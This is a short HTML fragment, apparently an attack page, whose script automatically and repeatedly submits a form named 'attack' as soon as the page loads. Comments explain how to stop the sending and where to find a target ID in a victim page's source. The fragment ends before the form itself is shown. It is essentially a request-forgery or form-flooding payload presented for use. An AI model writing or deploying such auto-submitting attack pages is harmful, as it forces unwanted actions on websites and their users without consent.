<!-- CTRL + W stop sending -->

<script type="text/javascript">
    let qtd = 0;
    let seconds = 2;
    const limit = 5;

    function send() {
        if (qtd < limit) {
            document.attack.submit();
        }
        qtd++;
    }

    function start() {
        seconds *= 10;
        window.setInterval(() => {
            send()
        }, seconds);
    }
</script>

<!--
The ID can be found in the source code of the page
-->

<body onload="start();">
